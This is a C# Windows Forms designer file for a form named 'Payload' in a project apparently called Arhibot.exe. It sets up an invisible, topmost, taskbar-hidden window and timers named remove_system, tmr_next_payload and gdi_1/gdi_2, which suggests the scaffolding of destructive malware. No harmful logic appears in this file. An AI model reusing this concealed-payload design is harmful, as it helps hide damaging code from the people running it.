
namespace Arhibot.exe_1._0
{
    partial class Payload
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.remove_system = new System.Windows.Forms.Timer(this.components);
            this.tmr_add = new System.Windows.Forms.Timer(this.components);
            this.tmr_next_payload = new System.Windows.Forms.Timer(this.components);
            this.gdi_1 = new System.Windows.Forms.Timer(this.components);
            this.gdi_2 = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // remove_system
            // 
            this.remove_system.Interval = 15000;
            this.remove_system.Tick += new System.EventHandler(this.remove_system_Tick);
            // 
            // tmr_add
            // 
            this.tmr_add.Interval = 10000;
            this.tmr_add.Tick += new System.EventHandler(this.tmr_add_Tick);
            // 
            // tmr_next_payload
            // 
            this.tmr_next_payload.Interval = 30000;
            this.tmr_next_payload.Tick += new System.EventHandler(this.tmr_next_payload_Tick);
            // 
            // gdi_1
            // 
            this.gdi_1.Interval = 30000;
            this.gdi_1.Tick += new System.EventHandler(this.gdi_1_Tick);
            // 
            // gdi_2
            // 
            this.gdi_2.Interval = 30000;
            this.gdi_2.Tick += new System.EventHandler(this.gdi_2_Tick);
            // 
            // Payload
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.ControlBox = false;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Payload";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultBounds;
            this.Text = "Payload";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Payload_FormClosing);
            this.Load += new System.EventHandler(this.Payload_Load);
            this.ResumeLayout(false);

        }

        #endregion
        private System.Windows.Forms.Timer remove_system;
        private System.Windows.Forms.Timer tmr_add;
        private System.Windows.Forms.Timer tmr_next_payload;
        private System.Windows.Forms.Timer gdi_1;
        private System.Windows.Forms.Timer gdi_2;
    }
}